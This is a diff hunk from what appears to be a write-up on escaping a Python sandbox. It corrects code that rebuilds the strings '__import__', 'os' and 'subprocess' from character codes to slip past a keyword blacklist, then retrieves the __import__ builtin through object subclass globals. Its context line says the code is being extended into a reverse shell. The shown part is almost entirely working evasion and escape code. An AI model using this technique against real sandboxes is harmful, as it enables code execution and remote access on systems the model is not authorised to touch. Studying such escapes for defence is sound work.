@@ -134,9 +134,9 @@ Now, we can easily extend our code and setup a reverse-shell using [python socke
 
 ```python
 # obfuscating `__import__`, `os` and `subprocess` strings to escape keywords blacklist
-imp_key = "".join([chr(i) for i in [95, 95, 105, 109, 112, 111, 114, 116, 95, 95]]
-o_s_key = "".join(chr(i) for i in [111, 115])            
-sub = "".join(chr(i) for i in [115, 117, 98, 112, 114, 111, 99, 101, 115, 115])
+imp_key = "".join([chr(i) for i in [95, 95, 105, 109, 112, 111, 114, 116, 95, 95]])
+o_s_key = "".join([chr(i) for i in [111, 115]])            
+sub = "".join([chr(i) for i in [115, 117, 98, 112, 114, 111, 99, 101, 115, 115]])
 
 # retrieving `__import__` builtin from `objects` subclasses                 
 imp_func = [ x.__init__.__globals__ for x in ''.__class__.__bases__[0].__subclasses__() if "wrapper" not in str(x.__init__)][0][imp_key]
